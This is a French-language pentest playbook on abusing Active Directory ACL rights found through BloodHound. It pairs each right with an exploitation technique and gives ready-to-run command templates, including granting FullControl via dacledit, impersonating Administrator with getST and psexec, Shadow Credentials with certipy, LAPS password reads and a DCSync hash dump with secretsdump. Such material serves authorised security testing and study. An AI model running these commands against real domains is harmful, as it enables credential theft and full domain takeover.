# AD ACL Abuse — Playbook récapitulatif

> Résumé des droits ACL/Extended Rights Active Directory les plus courants en pentest / BloodHound, avec les techniques d'exploitation associées et les commandes Linux/Windows.

## Tableau récapitulatif

| Droit (edge BloodHound) | Portée | Type d'objet cible typique | Technique d'exploitation | Reset mdp direct ? | Outil Linux principal |
|---|---|---|---|---|---|
| **WriteSPN** | Ciblé (1 attribut) | User | Targeted Kerberoasting (ajout SPN + demande TGS) | ❌ | `targetedKerberoast.py` |
| **AddSelf** | Ciblé (self-membership) | Groupe | Auto-ajout au groupe | ❌ | `bloodyAD add groupMember` |
| **ReadGMSAPassword** | Lecture seule | Compte gMSA | Extraction hash NTLM du gMSA | N/A (lecture) | `gMSADumper.py` |
| **ForceChangePassword** | Ciblé (extended right) | User | Reset mdp sans connaître l'ancien | ✅ | `bloodyAD set password` |
| **WriteOwner** | Indirect | Tout objet | Prise de owner → WriteDACL → droit au choix | Indirect | `owneredit.py` |
| **WriteDACL** | Indirect | Tout objet | Ajout d'une ACE (ex: GenericAll pour soi-même) | Indirect | `dacledit.py` |
| **GenericWrite** | Attributs classiques | User / Groupe / Computer | SPN (Kerberoasting), ajout membre, RBCD | ❌ | `bloodyAD set object / add groupMember` |
| **GenericAll** | Total | Tout objet | Toutes les techniques ci-dessus au choix | ✅ | `bloodyAD` (multi-actions) |
| **Owns (Owner)** | Implicite | Tout objet | Modifier l'ACL directement (WRITE_DAC implicite) | Indirect | `dacledit.py` |
| **AllowedToDelegate** (Constrained Delegation) | Ciblé | Computer/service | S4U2Self/S4U2Proxy — usurper un user vers un SPN autorisé | ❌ | `getST.py` |
| **AllowedToAct** (RBCD) | Ciblé (attribut `msDS-AllowedToActOnBehalfOfOtherIdentity`) | Computer | Configurer délégation entrante → usurper Administrator | ❌ | `rbcd.py` + `getST.py` |
| **ReadLAPSPassword** | Lecture seule | Computer (LAPS activé) | Lecture mdp administrateur local en clair | N/A (lecture) | `bloodyAD get object --attr ms-Mcs-AdmPwd` |
| **AddKeyCredentialLink** (Shadow Credentials) | Ciblé (attribut `msDS-KeyCredentialLink`) | User / Computer | Ajout d'une clé publique → auth PKINIT sans connaître le mdp | ✅ (indirect, via cert) | `pywhisker` / `certipy` |
| **GetChanges + GetChangesAll** (DCSync) | Réplication AD | Domaine entier | Simulation d'un DC → extraction de tous les hashes du domaine | N/A (lecture) | `secretsdump.py -just-dc` |
| **AddMember** (sur un groupe précis, pas self) | Ciblé | Groupe | Ajout de n'importe quel user au groupe | ❌ | `bloodyAD add groupMember` |
| **ExtendedRight (All)** | Tous les extended rights | User/Objet | Équivaut à ForceChangePassword + autres extended rights combinés | ✅ | selon le right concerné |

---

## Détails des techniques non encore documentées dans le thread

### WriteDACL
Permet d'ajouter directement une nouvelle ACE dans le Security Descriptor de l'objet cible, sans passer par WriteOwner au préalable (contrairement à WriteOwner, ici pas besoin de devenir propriétaire).

```bash
# S'accorder GenericAll directement
dacledit.py -action write -rights FullControl -principal '<user>' -target '<target_object>' '<domain>/<user>:<password>'
```

### AllowedToDelegate (Constrained Delegation classique)
Si un compte a `msDS-AllowedToDelegateTo` configuré vers un SPN, et que tu contrôles ce compte, tu peux usurper n'importe quel utilisateur du domaine (sauf comptes protégés) vers ce service précis.

```bash
getST.py -spn '<service>/<target_host>' -impersonate Administrator '<domain>/<user>:<password>' -dc-ip <dc_ip>
export KRB5CCNAME=Administrator.ccache
psexec.py -k -no-pass <target_host>
```

### ReadLAPSPassword
LAPS gère un mot de passe administrateur local aléatoire, changé périodiquement, stocké dans `ms-Mcs-AdmPwd` (LAPS legacy) ou `msLAPS-Password` (Windows LAPS). Si tu as le droit de lecture sur cet attribut :

```bash
bloodyAD --host <dc_ip> -d <domain> -u <user> -p '<password>' get object <target_computer>$ --attr ms-Mcs-AdmPwd
```

### AddKeyCredentialLink (Shadow Credentials)
Technique moderne : tu ajoutes ta propre clé publique dans l'attribut `msDS-KeyCredentialLink` du compte cible, ce qui te permet ensuite de t'authentifier comme ce compte via PKINIT (certificat), sans connaître ni changer son mot de passe. Très discret.

```bash
certipy shadow auto -account '<target_user>' -u '<user>@<domain>' -p '<password>' -dc-ip <dc_ip>
```

### DCSync (GetChanges + GetChangesAll)
Si tu disposes des deux extended rights combinés sur l'objet domaine (souvent via un compte type "backup" ou mal configuré), tu peux simuler la réplication d'un DC et extraire tous les hashes du domaine, y compris krbtgt.

```bash
secretsdump.py <domain>/<user>:'<password>'@<dc_ip> -just-dc
```

---

## Règle générale de lecture d'un chemin BloodHound

1. Identifier le **type de droit** (lecture / écriture ciblée / écriture totale / propriété).
2. Identifier le **type d'objet cible** (user / groupe / computer / GPO / domaine).
3. Croiser les deux dans le tableau ci-dessus pour choisir la technique.
4. Si le droit est indirect (WriteOwner, Owns), prévoir une **étape intermédiaire** (WriteDACL) avant la technique finale.
5. Toujours vérifier si la cible est un compte protégé (`Protected Users`, `AdminSDHolder`, `Domain Admins`) — certaines techniques échouent silencieusement sur ces comptes (délégation bloquée, etc.).
